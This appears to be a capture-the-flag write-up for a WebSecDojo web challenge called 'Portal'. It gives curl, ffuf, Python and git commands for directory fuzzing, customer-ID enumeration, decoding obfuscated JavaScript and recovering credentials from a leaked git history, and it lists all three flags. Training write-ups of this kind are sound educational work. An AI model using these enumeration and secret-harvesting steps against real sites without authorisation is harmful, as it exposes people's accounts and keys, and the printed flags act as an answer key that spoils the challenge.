---
title: "Portal"
date: 2026-03-20
categories:
  - Web
tags:
  - Web
  - WebSecDojo
collections:
  - WebSecDojo
---



{{< admonition tldr "TL;DR" >}}

**Portal** is a web challenge from **WebSecDojo**. This challenge involves a web application with multiple vulnerabilities. The goal is to obtain three flags by analyzing exposed endpoints, client-side JavaScript, and leaked source code.

{{< /admonition >}}

## Challenge Overview

This challenge involves a web application with multiple vulnerabilities. The goal is to obtain three flags by analyzing exposed endpoints, client-side JavaScript, and leaked source code.

---

## Step 1: Reconnaissance

Perform directory fuzzing on the target:

```bash
ffuf -u https://websecdojo.com/portal/FUZZ -w /usr/share/wordlists/dirb/common.txt
```
Discovered endpoints:

* `/portal/` * `/portal/login` * `/portal/dashboard` * `/portal/robots.txt` Retrieve the robots file:

```bash
curl https://websecdojo.com/portal/robots.txt
```

Output:

```
User-Agent: *
Disallow: /customers
```

---

## Step 2: Analyze Hidden Endpoints

Access the `/customers` endpoint:

```bash
curl https://websecdojo.com/portal/customers
```

Response:

```json
{"error":"Not found. Customer id should be 000X"}
```

This suggests a structured customer ID format.

---

## Step 3: Customer Enumeration

Test path-based access:

```bash
curl https://websecdojo.com/portal/customers/0001
curl https://websecdojo.com/portal/customers/0002
curl https://websecdojo.com/portal/customers/0003
```

Result:

```json
{"message":"Customer found! Login is with customer id and flag as password"}
```

Valid customer ID identified:

```
0002
```

---

## Step 4: Analyze JavaScript (Flag 1)

Retrieve the JavaScript file:

```bash
curl https://websecdojo.com/portal/script.js
```

The script contains:

* A custom character mapping
* Conversion to hexadecimal
* Conversion to ASCII
* Execution via `eval()` Two variables are present:

* `output` (decoy)
* `hidden` (actual payload)

Decode the `hidden` variable using Python:

```bash
python3 - << 'EOF'
mapping = {
    'q':"0",'w':"1",'e':"2",'r':"3",'t':"4",'y':"5",
    'u':"6",'i':"7",'o':"8",'p':"9",
    'A':"a",'S':"b",'D':"c",'F':"d",'G':"e",'H':"f"
}
s="uuuDuwuieryruHieieiptuuHieteuyupuGuitwuGuGuHipupuGui"
h="".join(mapping[c] for c in s if c in mapping)
print(bytes.fromhex(h).decode())
EOF
```

Output:

```
flag#SorryForBeingAnnoying
```

Flag 1:

```
flag#SorryForBeingAnnoying
```

---

## Step 5: Authentication

Login using the discovered credentials:

```bash
curl -X POST https://websecdojo.com/portal/login \
-d "username=0002&password=flag#SorryForBeingAnnoying" -i
```

The response includes a session cookie and a redirect to `/portal/dashboard` .

---

## Step 6: Access Dashboard (Flag 2)

Use the session cookie to access the dashboard:

```bash
curl https://websecdojo.com/portal/dashboard \
-H "Cookie: session=<SESSION_VALUE>"
```

Response contains:

```html
Welcome, Customer #0002 (flag#SecondFlagOfTheChallenge)
```

Flag 2:

```
flag#SecondFlagOfTheChallenge
```

---

## Step 7: Download Source Code

Download the project archive:

```bash
curl -O https://websecdojo.com/portal/project.zip
```

Extract the archive:

```bash
unzip project.zip
```

Directory structure:

```
project/
├── main.py
└── .git/
```

---

## Step 8: Analyze Git Repository (Flag 3)

Navigate to the project directory:

```bash
cd project
```

Inspect commit history:

```bash
git --no-pager log -p
```

A commit shows that secrets were removed:

```diff
-S3_BUCKET_NAME = "flag#SoCallMeMaybe"
-AWS_ACCESS_KEY = "flag#SoCallMeMaybe"
-AWS_SECRET_KEY = "flag#SoCallMeMaybe"
```

The initial commit contains the original values:

```python
S3_BUCKET_NAME = "flag#SoCallMeMaybe"
AWS_ACCESS_KEY = "flag#SoCallMeMaybe"
AWS_SECRET_KEY = "flag#SoCallMeMaybe"
```

Flag 3:

```
flag#SoCallMeMaybe
```

---

## Final Flags

```
flag#SorryForBeingAnnoying
flag#SecondFlagOfTheChallenge
flag#SoCallMeMaybe
```
